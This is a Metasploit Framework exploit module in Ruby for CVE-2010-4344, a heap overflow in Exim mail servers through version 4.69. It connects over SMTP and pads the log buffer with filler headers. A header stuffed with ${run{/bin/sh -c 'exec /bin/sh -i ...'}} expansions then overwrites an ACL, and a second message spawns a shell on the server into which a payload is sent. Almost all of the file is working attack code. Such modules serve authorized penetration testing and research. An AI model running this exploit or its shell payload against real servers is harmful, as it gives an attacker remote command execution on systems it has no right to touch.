##
# $Id: exim4_string_format.rb 11274 2010-12-10 19:34:23Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = ExcellentRanking

	include Msf::Exploit::Remote::Smtp

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Exim4 <= 4.69 string_format Function Heap Buffer Overflow',
			'Description'    => %q{
					This module exploits a heap buffer overflow within versions of Exim prior to
				version 4.69. By sending a specially crafted message, an attacker can corrupt the
				heap and execute arbitrary code with the privileges of the Exim daemon.

				The root cause is that no check is made to ensure that the buffer is not full 
				prior to handling '%s' format specifiers within the 'string_vformat' function.
				In order to trigger this issue, we get our message rejected by sending a message
				that is too large. This will call into log_write to log rejection headers (which 
				is a default configuration setting). After filling the buffer, a long header
				string is sent. In a successful attempt, it overwrites the ACL for the 'MAIL 
				FROM' command. By sending a second message, the string we sent will be evaluated 
				with 'expand_string' and arbitrary shell commands can be executed.

				It is likely that this issue could also be exploited using other techniques such
				as targeting in-band heap management structures, or perhaps even function pointers
				stored in the heap. However, these techniques would likely be far more platform
				specific, more complicated, and less reliable.

				This bug was original found and reported in December 2008, but was not
				properly handled as a security issue. Therefore, there was a 2 year lag time
				between when the issue was fixed and when it was discovered being exploited
				in the wild. At that point, the issue was assigned a CVE and began being 
				addressed by downstream vendors.

				An additional vulnerability, CVE-2010-4345, was also used in the attack that
				led to the discovery of danger of this bug. This bug allows a local user to
				gain root privileges from the Exim user account. We are not currently
				utilizing that bug within this module.
			},
			'Author'         => [ 'jduck' ],
			'License'        => MSF_LICENSE,
			'Version'        => '$Revision: 11274 $',
			'References'     =>
				[
					[ 'CVE', '2010-4344' ],
					# [ 'OSVDB', '' ],
					# [ 'BID', '' ],
					# [ 'URL', '' ],
					[ 'URL', 'http://seclists.org/oss-sec/2010/q4/311' ],
					[ 'URL', 'http://www.gossamer-threads.com/lists/exim/dev/89477' ],
					[ 'URL', 'http://bugs.exim.org/show_bug.cgi?id=787' ],
					[ 'URL', 'http://git.exim.org/exim.git/commitdiff/24c929a27415c7cfc7126c47e4cad39acf3efa6b' ]
				],
			'Privileged'     => false,
			'Payload'        =>
				{
					'DisableNops' => true,
					'Space'       => 8192, # much more in reality, but w/e
					'Compat'      =>
						{
							'PayloadType' => 'cmd',
							'RequiredCmd' => 'generic perl ruby bash telnet',
						}
				},
			'Platform'       => 'unix',
			'Arch'           => ARCH_CMD,
			'Targets'        =>
				[
					[ 'Automatic', { }],
				],
			# Originally discovered/reported Dec 2 2008
			'DisclosureDate' => 'Dec 7 2010', # as an actual security bug
			'DefaultTarget'  => 0))
	end

	def exploit

		from = datastore['MAILFROM']
		to = datastore['MAILTO']

		helo_host = "X"  # From the mixin
		max_msg = 52428800
		msg_len = max_msg + 1000 # just for good measure
		log_buffer_size = 8192
		ip = Rex::Socket.source_address('1.2.3.4')

		# The initial headers will fill up the 'log_buffer' variable in 'log_write' function
		print_status("Constructing initial headers ...")
		log_buffer = "YYYY-MM-DD HH:MM:SS XXXXXX-YYYYYY-ZZ rejected from <#{from}> H=(#{helo_host}) [#{ip}]: message too big: read=#{msg_len} max=#{max_msg}\n"
		log_buffer << "Envelope-from: <#{from}>\nEnvelope-to: <#{to}>\n"

		# Now, "  " + hdrline for each header
		hdrs = []
		filler = rand_text_alphanumeric(8 * 16)

		# We want 2 bytes left, so we subtract from log_buffer_size here
		log_buffer_size -= 3 # we use 3 since they account for a trailing nul
		60.times { |x|
			break if log_buffer.length >= log_buffer_size

			hdr = "Header%04d: %s\n" % [x, filler]
			newlen = log_buffer.length + hdr.length
			if newlen > log_buffer_size
				newlen -= log_buffer_size
				# chop the excess, NOTE: the "2" is for the "  " before the header
				off = hdr.length - newlen - 2 - 1
				hdr.slice!(off, hdr.length)
				hdr << "\n"
			end
			hdrs << hdr
			log_buffer << "  " << hdr
		}
		hdrs1 = hdrs.join

		# This header will smash various heap stuff, hopefully including the ACL
		print_status("Constructing HeaderX ...")
		hdrx = 'HeaderX: '
		1.upto(50) { |a|
			3.upto(12) { |b|
				hdrx << "${run{/bin/sh -c 'exec /bin/sh -i <&#{b} >&0 2>&0'}} "
			}
		}

		# In order to trigger the overflow, we must get our message rejected.
		# To do so, we send a message that is larger than the maximum.
		print_status("Constructing body ...")
		body = ''
		659883.times {
			body << ("MAILbomb" * 10) + "\n"
		}

		body_len = 53450538 - (53477372-52428800) + 1

		print_status("Combining parts ...")
		data = ''
		data << hdrs1
		data << hdrx
		data << "\n"
		data << body

		print_status("Connecting ...")
		connect_login
		print_status("Sending data ...")
		sock.put data

		print_status("Ending first message.")
		buf = raw_send_recv("\n.\n")
		# Should be: ""552 Message size exceeds maximum permitted\r\n"
		print_status("Result: #{buf.inspect}") if buf

		print_status("Sending second message ...")
		buf = raw_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
		# Should be: "sh-x.x$ " !!
		print_status("MAIL result: #{buf.inspect}") if buf

      buf = raw_send_recv("RCPT TO: #{datastore['MAILTO']}\r\n")
		# Should be: "sh: RCPT: command not found\n"
		print_status("RCPT result: #{buf.inspect}") if buf

		print_status("Should have a shell now, sending our payload to it..")
		buf = raw_send_recv("\n" + payload.encoded + "\n\n")
		print_status("Payload result: #{buf.inspect}") if buf
		# Give some time for the payload to be consumed
		select(nil, nil, nil, 4)

		handler
		disconnect
	end

end
